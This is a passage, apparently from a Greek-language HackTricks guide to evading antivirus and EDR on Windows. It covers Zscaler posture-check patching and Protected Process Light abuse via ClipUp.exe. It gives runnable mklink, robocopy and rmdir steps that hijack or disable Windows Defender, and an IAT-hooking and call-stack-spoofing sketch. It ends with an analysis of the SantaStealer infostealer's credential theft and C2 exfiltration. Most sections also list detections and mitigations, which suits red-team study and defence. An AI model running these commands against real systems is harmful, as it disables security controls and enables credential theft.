f.seek(off)
f.write(replacement)
```
Αφού αντικαταστήθηκαν τα αρχικά αρχεία και επανεκκινήθηκε το service stack:

* **Όλοι** οι έλεγχοι κατάστασης εμφανίζουν **πράσινο/συμβατό**.
* Μη υπογεγραμμένα ή τροποποιημένα binaries μπορούν να ανοίξουν τα named-pipe RPC endpoints (π.χ. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Ο παραβιασμένος host αποκτά απεριόριστη πρόσβαση στο εσωτερικό δίκτυο που ορίζεται από τις πολιτικές της Zscaler.

Αυτή η μελέτη περίπτωσης δείχνει πώς οι καθαρά client-side αποφάσεις εμπιστοσύνης και οι απλοί έλεγχοι υπογραφής μπορούν να παρακαμφθούν με λίγα byte patches.

## Κατάχρηση Protected Process Light (PPL) για παραποίηση AV/EDR με LOLBINs

Protected Process Light (PPL) εφαρμόζει μια ιεραρχία signer/level ώστε μόνο προστατευμένες διεργασίες με ίσο ή υψηλότερο επίπεδο να μπορούν να επεμβαίνουν η μία στην άλλη. Επιθετικά, αν μπορείτε νόμιμα να ξεκινήσετε ένα PPL-enabled binary και να ελέγξετε τα arguments του, μπορείτε να μετατρέψετε μια αβλαβή λειτουργία (π.χ., logging) σε ένα περιορισμένο, PPL-backed write primitive ενάντια σε προστατευμένους καταλόγους που χρησιμοποιούνται από AV/EDR.

Τι απαιτείται για να εκτελείται μια διεργασία ως PPL
- Ο στοχευόμενος EXE (και τυχόν φορτωμένες DLLs) πρέπει να είναι υπογεγραμμένος με ένα PPL-capable EKU.
- Η διεργασία πρέπει να δημιουργηθεί με CreateProcess χρησιμοποιώντας τις flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Πρέπει να ζητηθεί ένα συμβατό protection level που ταιριάζει με τον signer του binary (π.χ., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` για anti-malware signers, `PROTECTION_LEVEL_WINDOWS` για Windows signers). Λανθασμένα levels θα αποτύχουν κατά τη δημιουργία.

Δείτε επίσης μια ευρύτερη εισαγωγή σε PP/PPL και προστασία LSASS εδώ:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Εργαλεία εκκίνησης
- Open-source helper: CreateProcessAsPPL (επιλέγει το protection level και προωθεί τα arguments στο target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Παράδειγμα χρήσης:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Το υπογεγραμμένο συστημικό binary `C:\Windows\System32\ClipUp.exe` αυτο-εκκινεί και δέχεται παράμετρο για να γράψει ένα αρχείο καταγραφής σε διαδρομή που καθορίζεται από τον καλούντα.
- Όταν εκκινείται ως διαδικασία PPL, η εγγραφή αρχείου γίνεται με PPL υποστήριξη.
- Το ClipUp δεν μπορεί να αναλύσει διαδρομές που περιέχουν κενά· χρησιμοποιήστε 8.3 short paths για να δείξετε σε κανονικά προστατευμένες τοποθεσίες.

8.3 short path helpers
- List short names: `dir /x` σε κάθε γονικό κατάλογο.
- Derive short path in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Εκκινήστε το PPL-capable LOLBIN (ClipUp) με `CREATE_PROTECTED_PROCESS` χρησιμοποιώντας έναν launcher (π.χ., CreateProcessAsPPL).
2) Δώστε το όρισμα log-path του ClipUp για να προκαλέσετε δημιουργία αρχείου σε προστατευμένο AV directory (π.χ., Defender Platform). Χρησιμοποιήστε 8.3 short names αν χρειαστεί.
3) Εάν το target binary είναι συνήθως ανοιχτό/κλειδωμένο από το AV ενώ τρέχει (π.χ., MsMpEng.exe), προγραμματίστε την εγγραφή στην εκκίνηση πριν ξεκινήσει το AV εγκαθιστώντας μια υπηρεσία auto-start που εκτελείται πιο νωρίς. Επαληθεύστε τη σειρά εκκίνησης με Process Monitor (boot logging).
4) Στο reboot η εγγραφή με PPL υποστήριξη γίνεται πριν το AV κλειδώσει τα binaries του, καταστρέφοντας το target file και εμποδίζοντας την εκκίνηση.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Σημειώσεις και περιορισμοί
- Δεν μπορείτε να ελέγξετε το περιεχόμενο που γράφει το ClipUp πέρα από τη θέση· το primitive είναι πιο κατάλληλο για αλλοίωση παρά για ακριβή εισαγωγή περιεχομένου.
- Απαιτεί local admin/SYSTEM για να εγκαταστήσει/εκκινήσει μια υπηρεσία και παράθυρο επανεκκίνησης.
- Ο χρονισμός είναι κρίσιμος: ο στόχος δεν πρέπει να είναι ανοιχτός· η εκτέλεση κατά το χρόνο εκκίνησης αποφεύγει κλειδώματα αρχείων.

Ανιχνεύσεις
- Δημιουργία διεργασίας του `ClipUp.exe` με ασυνήθη επιχειρήματα, ειδικά όταν ο γονέας είναι μη τυπικοί εκκινητές, γύρω από την εκκίνηση.
- Νέες υπηρεσίες ρυθμισμένες να auto-start ύποπτα binaries και που ξεκινούν επανειλημμένα πριν από Defender/AV. Ερευνήστε δημιουργία/τροποποίηση υπηρεσίας πριν από αποτυχίες εκκίνησης του Defender.
- Παρακολούθηση ακεραιότητας αρχείων στα Defender binaries/Platform directories· αναπάντεχες δημιουργίες/τροποποιήσεις αρχείων από διεργασίες με protected-process flags.
- ETW/EDR τηλεμετρία: αναζητήστε διεργασίες που δημιουργήθηκαν με `CREATE_PROTECTED_PROCESS` και ανώμαλη χρήση επιπέδου PPL από non-AV binaries.

Μέτρα αντιμετώπισης
- WDAC/Code Integrity: περιορίστε ποια signed binaries μπορούν να τρέξουν ως PPL και υπό ποιους γονείς· μπλοκάρετε τη χρήση του ClipUp εκτός νόμιμων contexts.
- Καθαριότητα υπηρεσιών: περιορίστε τη δημιουργία/τροποποίηση auto-start υπηρεσιών και παρακολουθήστε χειρισμούς στη σειρά εκκίνησης.
- Βεβαιώστε ότι Defender tamper protection και early-launch protections είναι ενεργοποιημένα· ερευνήστε σφάλματα εκκίνησης που υποδεικνύουν αλλοίωση binary.
- Σκεφτείτε να απενεργοποιήσετε τη δημιουργία 8.3 short-name σε volumes που φιλοξενούν security tooling εφόσον είναι συμβατό με το περιβάλλον σας (δοκιμάστε διεξοδικά).

Αναφορές για PPL και tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Το Windows Defender επιλέγει την πλατφόρμα από την οποία τρέχει με την επανάληψη των υποφακέλων κάτω από:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Επιλέγει τον υποφάκελο με το μεγαλύτερο λεξικογραφικό version string (π.χ., `4.18.25070.5-0`), και στη συνέχεια ξεκινά τις διαδικασίες υπηρεσίας Defender από εκεί (ενημερώνοντας τα service/registry paths αναλόγως). Αυτή η επιλογή εμπιστεύεται τις εγγραφές καταλόγων συμπεριλαμβανομένων των directory reparse points (symlinks). Ένας administrator μπορεί να εκμεταλλευτεί αυτό για να ανακατευθύνει το Defender σε ένα attacker-writable path και να επιτύχει DLL sideloading ή διακοπή υπηρεσίας.

Προϋποθέσεις
- Local Administrator (απαιτείται για να δημιουργήσει directories/symlinks κάτω από τον φάκελο Platform)
- Ικανότητα επανεκκίνησης ή ενεργοποίησης επανεπιλογής πλατφόρμας Defender (service restart on boot)
- Απαιτούνται μόνο built-in εργαλεία (mklink)

Γιατί λειτουργεί
- Ο Defender μπλοκάρει εγγραφές στους δικούς του φακέλους, αλλά η επιλογή πλατφόρμας εμπιστεύεται εγγραφές καταλόγων και επιλέγει την λεξικογραφικά υψηλότερη έκδοση χωρίς να επαληθεύει ότι ο στόχος επιλύεται σε protected/trusted path.

Βήμα-βήμα (παράδειγμα)
1) Προετοιμάστε ένα writable clone του τρέχοντος platform folder, π.χ. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Δημιουργήστε ένα higher-version directory symlink μέσα στο Platform που δείχνει στον φάκελό σας:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Επιλογή trigger (συνιστάται επανεκκίνηση):
```cmd
shutdown /r /t 0
```
4) Επιβεβαιώστε ότι το MsMpEng.exe (WinDefend) εκτελείται από την ανακατευθυνόμενη διαδρομή:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Πρέπει να παρατηρήσετε τη νέα διαδρομή διεργασίας κάτω από `C:\TMP\AV\` και τη ρύθμιση υπηρεσίας/μητρώου να αντικατοπτρίζει αυτή τη θέση.

Post-exploitation options
- DLL sideloading/code execution: Τοποθετήστε/αντικαταστήστε DLLs που φορτώνει ο Defender από τον κατάλογο εφαρμογής του για να εκτελέσετε κώδικα στις διεργασίες του Defender. Δείτε την ενότητα παραπάνω: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Αφαιρέστε το version-symlink ώστε στην επόμενη εκκίνηση η διαμορφωμένη διαδρομή να μην επιλυθεί και ο Defender να αποτύχει να ξεκινήσει:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Σημειώστε ότι αυτή η τεχνική δεν παρέχει μόνη της privilege escalation· απαιτεί admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Οι Red teams μπορούν να μεταφέρουν το runtime evasion έξω από το C2 implant και μέσα στο ίδιο το target module κάνοντας hook το Import Address Table (IAT) και δρομολογώντας επιλεγμένα APIs μέσω attacker-controlled, position‑independent code (PIC). Αυτό γενικεύει την evasion πέρα από τη μικρή επιφάνεια API που εκθέτουν πολλά kits (π.χ. CreateProcessA) και επεκτείνει τις ίδιες προστασίες σε BOFs και post‑exploitation DLLs.

High-level approach
- Σταχτοποιήστε ένα PIC blob δίπλα στο target module χρησιμοποιώντας έναν reflective loader (prepended ή companion). Το PIC πρέπει να είναι self‑contained και position‑independent.
- Καθώς το host DLL φορτώνεται, διασχίστε το IMAGE_IMPORT_DESCRIPTOR και επιδιορθώστε τις εγγραφές IAT για τα στοχευόμενα imports (π.χ., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) ώστε να δείχνουν σε λεπτά PIC wrappers.
- Κάθε PIC wrapper εκτελεί evasions πριν κάνει tail‑call στη πραγματική διεύθυνση API. Τυπικές evasions περιλαμβάνουν:
  - Memory mask/unmask γύρω από την κλήση (π.χ., encrypt beacon regions, RWX→RX, αλλαγή ονομάτων/permissions των σελίδων) και επαναφορά μετά την κλήση.
  - Call‑stack spoofing: κατασκευή ενός benign stack και μετάβαση στο target API ώστε η ανάλυση call‑stack να επιλύεται σε αναμενόμενα frames.
  - Για συμβατότητα, εξάγετε ένα interface ώστε ένα Aggressor script (ή ισοδύναμο) να μπορεί να καταχωρίσει ποια APIs θα γίνουν hook για Beacon, BOFs και post‑ex DLLs.

Why IAT hooking here
- Λειτουργεί για οποιονδήποτε κώδικα που χρησιμοποιεί το hooked import, χωρίς να τροποποιεί τον κώδικα των εργαλείων ή να βασίζεται στο Beacon για proxy συγκεκριμένων APIs.
- Καλύπτει post‑ex DLLs: το hooking του LoadLibrary* σας επιτρέπει να υποκλέπτετε φορτώσεις modules (π.χ., System.Management.Automation.dll, clr.dll) και να εφαρμόζετε το ίδιο masking/stack evasion στις κλήσεις API τους.
- Επαναφέρει την αξιόπιστη χρήση των process‑spawning post‑ex εντολών απέναντι σε detections που βασίζονται σε call‑stack, τυλίγοντας το CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Σημειώσεις
- Εφαρμόστε το patch μετά τις relocations/ASLR και πριν την πρώτη χρήση του import. Reflective loaders όπως TitanLdr/AceLdr δείχνουν hooking κατά το DllMain του φορτωμένου module.
- Κρατήστε τους wrappers μικρούς και PIC‑safe· επιλύστε την πραγματική API μέσω της αρχικής IAT τιμής που καταγράψατε πριν το patch ή μέσω LdrGetProcedureAddress.
- Χρησιμοποιήστε μεταβάσεις RW → RX για PIC και αποφύγετε να αφήνετε writable+executable σελίδες.

Call‑stack spoofing stub
- Draugr‑style PIC stubs δημιουργούν μια ψεύτικη call chain (return addresses προς benign modules) και στη συνέχεια pivot στο πραγματικό API.
- Αυτό παρακάμπτει detections που αναμένουν canonical stacks από Beacon/BOFs προς sensitive APIs.
- Συνδυάστε με stack cutting/stack stitching techniques για να βρεθείτε μέσα στα αναμενόμενα frames πριν το API prologue.

Operational integration
- Προθέστε τον reflective loader στα post‑ex DLLs ώστε το PIC και τα hooks να αρχικοποιούνται αυτόματα όταν το DLL φορτώνεται.
- Χρησιμοποιήστε ένα Aggressor script για να καταχωρήσετε target APIs ώστε Beacon και BOFs να επωφελούνται διαφανώς από την ίδια evasion path χωρίς αλλαγές κώδικα.

Detection/DFIR considerations
- IAT integrity: εγγραφές που επιλύονται σε non‑image (heap/anon) διευθύνσεις· περιοδική επαλήθευση των import pointers.
- Stack anomalies: return addresses που δεν ανήκουν σε loaded images· απότομες μεταβάσεις σε non‑image PIC· ασυνεπής RtlUserThreadStart ancestry.
- Loader telemetry: in‑process writes στο IAT, πρώιμη δραστηριότητα DllMain που τροποποιεί import thunks, απροσδόκητες RX περιοχές που δημιουργούνται κατά το load.
- Image‑load evasion: αν γίνεται hooking του LoadLibrary*, παρακολουθήστε suspicious loads of automation/clr assemblies που συσχετίζονται με memory masking events.

Related building blocks and examples
- Reflective loaders που εκτελούν IAT patching κατά το load (π.χ., TitanLdr, AceLdr)
- Memory masking hooks (π.χ., simplehook) και stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (π.χ., Draugr)

## SantaStealer Tradecraft για Fileless Evasion και Κλοπή Διαπιστευτηρίων

Το SantaStealer (aka BluelineStealer) δείχνει πώς σύγχρονοι info-stealers συνδυάζουν AV bypass, anti-analysis και credential access σε ένα ενιαίο workflow.

### Keyboard layout gating & sandbox delay

- Ένα config flag (`anti_cis`) απαριθμεί τις εγκατεστημένες keyboard layouts μέσω της `GetKeyboardLayoutList`. Εάν βρεθεί Cyrillic layout, το δείγμα ρίχνει έναν κενό `CIS` marker και τερματίζει πριν τρέξει τους stealers, εξασφαλίζοντας ότι δεν θα ενεργοποιηθεί ποτέ σε αποκλεισμένες τοπικές ρυθμίσεις ενώ αφήνει ένα hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Πολυστρωματική λογική `check_antivm`

- Το Variant A διασχίζει τη λίστα διεργασιών, hashes κάθε όνομα με ένα custom rolling checksum, και το συγκρίνει με ενσωματωμένες blocklists για debuggers/sandboxes· επαναλαμβάνει το checksum πάνω στο όνομα του υπολογιστή και ελέγχει working directories όπως `C:\analysis`.
- Το Variant B ελέγχει system properties (process-count floor, recent uptime), καλεί `OpenServiceA("VBoxGuest")` για να εντοπίσει VirtualBox additions, και εκτελεί timing checks γύρω από sleeps για να εντοπίσει single-stepping. Οποιοδήποτε hit ακυρώνει πριν την εκκίνηση των modules.

### Fileless helper + διπλό ChaCha20 reflective loading

- Το primary DLL/EXE ενσωματώνει έναν Chromium credential helper που είτε dropped to disk είτε manually mapped in-memory; fileless mode επιλύει τα imports/relocations μόνο του ώστε να μην γράφονται helper artifacts.
- Αυτός ο helper αποθηκεύει ένα second-stage DLL κρυπτογραφημένο δύο φορές με ChaCha20 (two 32-byte keys + 12-byte nonces). Μετά από τα δύο περάσματα, reflectively loads το blob (no `LoadLibrary`) και καλεί exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` που προέρχονται από [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Οι ChromElevator routines χρησιμοποιούν direct-syscall reflective process hollowing για να inject σε ένα live Chromium browser, να inherit AppBound Encryption keys, και να decrypt passwords/cookies/credit cards απευθείας από SQLite databases παρά την ABE hardening.

### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` διατρέχει έναν global `memory_generators` function-pointer table και spawnάρει ένα thread ανά enabled module (Telegram, Discord, Steam, screenshots, documents, browser extensions, κ.ά.). Κάθε thread γράφει αποτελέσματα σε shared buffers και αναφέρει τον αριθμό αρχείων μετά από ένα ~45s join window.
- Μόλις τελειώσει, όλα συμπιέζονται με τη statically linked `miniz` library ως `%TEMP%\\Log.zip`. Το `ThreadPayload1` στη συνέχεια sleepάρει 15s και streams το archive σε 10 MB chunks μέσω HTTP POST στο `http://<C2>:6767/upload`, spoofάροντας ένα browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Κάθε chunk προσθέτει `User-Agent: upload`, `auth: <build_id>`, προαιρετικό `w: <campaign_tag>`, και το τελευταίο chunk appends `complete: true` ώστε το C2 να ξέρει ότι η reassembly ολοκληρώθηκε.

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)

{{#include ../banners/hacktricks-training.md}}
